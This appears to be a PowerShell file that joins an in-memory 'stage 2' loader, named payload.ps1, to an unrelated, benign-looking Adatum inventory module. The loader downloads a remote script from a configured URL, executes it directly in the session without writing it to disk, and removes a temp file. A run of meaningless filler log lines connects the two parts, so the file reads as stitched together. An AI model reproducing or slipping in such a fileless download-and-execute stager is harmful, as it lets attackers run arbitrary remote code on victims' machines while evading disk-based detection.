
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://contoso.com/stage2.ps1',
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$StageTimeout = 101
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 101
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $RemoteScript = Get-StageScriptText -SourceUrl $FetchUrl -TimeoutSec $StageTimeout
    $OperationResult = Invoke-Stage2Script -ScriptBody $RemoteScript
    Write-Verbose "Stage result: $($OperationResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $FetchUrl
    ScriptLength = $RemoteScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Starting workflow"
Write-Verbose "Checking local path"
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
Write-Verbose "Preparing working directory"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Operation completed"
Write-Verbose "Retry budget remaining"
Write-Verbose "Resolving configured target"
Write-Output "stage 16 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
#Requires -Version 5.1

Set-StrictMode -Version 2.0
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$script:DefaultTimeout = 10
$script:ModuleVersion = '2.8.2'

function Get-AdatumNode {
    <#
    .SYNOPSIS
        Returns Adatum inventory records.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Dev'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-AdatumNodeTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-AdatumNodeHealth {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

Export-ModuleMember -Function Get-AdatumNode, Set-AdatumNodeTag, Test-AdatumNodeHealth
